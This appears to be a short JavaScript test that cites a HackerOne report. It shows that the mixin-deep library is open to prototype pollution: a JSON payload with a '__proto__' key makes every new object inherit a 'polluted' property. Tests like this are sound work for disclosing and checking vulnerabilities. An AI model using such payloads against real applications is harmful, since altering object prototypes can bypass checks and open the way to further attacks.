//https://hackerone.com/reports/311236
test("prototype pollution in mixin-deep ", () => {
  const mixin = require("mixin-deep");
  let malicious_payload = '{"__proto__":{"polluted":"yes"}}';

  let obj = {};

  expect({}.polluted).toBe(undefined);

  mixin({}, JSON.parse(malicious_payload));
  expect({}.polluted).toBe("yes");
});
